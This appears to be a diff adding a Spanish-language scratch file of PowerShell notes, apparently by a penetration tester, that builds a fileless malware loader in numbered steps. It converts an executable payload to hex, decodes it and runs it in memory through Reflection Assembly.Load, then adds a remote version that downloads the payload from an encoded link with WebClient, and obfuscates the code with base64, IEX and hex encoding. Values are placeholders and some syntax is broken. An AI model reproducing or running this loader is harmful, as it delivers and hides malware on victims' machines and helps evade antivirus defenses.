@@ -1,0 +1,96 @@
+1-
+$a = [System.IO.File]::ReadAllBytes("C:\Users\pente\Desktop\CARGA.exe")
+$MM = [System.BitConverter]::ToString($a) -replace("-","")
+$MM | Out-File c:\salida.png
+
+
+2-
+function sAcHCHPN {
+    param($IITJCmN)
+    $IITJCmN = $IITJCmN -split '(..)' | ? { $_ }
+    ForEach ($KMCAYfPj in $IITJCmN){
+        [Convert]::ToInt32($KMCAYfPj,16)
+    }
+}
+
+$cargaSTR = "234234234243324"
+[Byte[]] $CARGABYTES = sAcHCHPN $cargaSTR
+[System.Reflection.Assembly]::Load([Byte[]]($CARGABYTES)).entrypoint.invoke($null,$null)
+
+3- remota
+function sAcHCHPN {
+    param($IITJCmN)
+    $IITJCmN = $IITJCmN -split '(..)' | ? { $_ }
+    ForEach ($KMCAYfPj in $IITJCmN){
+        [Convert]::ToInt32($KMCAYfPj,16)
+    }
+}
+
+$linkcodi = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('rtretertrtter')
+$cargaSTR = (New-Object net.webclient).DownloadString('$linkcodi')
+[Byte[]] $CARGABYTES = sAcHCHPN $cargaSTR
+[System.Reflection.Assembly]::Load([Byte[]]($CARGABYTES)).entrypoint.invoke($null,$null)
+
+
+4-codificar la funcion
+
+$funcion = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('rtretertrtter')
+IEX $funcion
+start-sleep -s3
+
+$linkcodi = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('rtretertrtter')
+$cargaSTR = (New-Object net.webclient).DownloadString('$linkcodi')
+[Byte[]] $CARGABYTES = CALL $cargaSTR
+[System.Reflection.Assembly]::Load([Byte[]]($CARGABYTES)).entrypoint.invoke($null,$null)
+
+
+5-pasar link base64 a hexadecimal
+
+$funcion = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('rtretertrtter')
+IEX $funcion
+start-sleep -s3
+
+"hexadecimal"
+$XaWeRT = "hexadecimal"
+
+function HexToString($i){
+    $r = ""
+    for ($n = 0; $n -lt $i.Length: $n +=2)
+        {$r += [char][int]("0x" + $i.Substring($n,2))}
+    return $r    
+    }
+    $llamar = HexToString $XaWeRT
+
+$linkcodi = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('rtretertrtter')
+$cargaSTR = (New-Object net.webclient).DownloadString('$linkcodi')
+[Byte[]] $CARGABYTES = CALL $cargaSTR
+[System.Reflection.Assembly]::Load([Byte[]]($CARGABYTES)).entrypoint.invoke($null,$null)
+
+
+COMPRESION DE BYTES
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
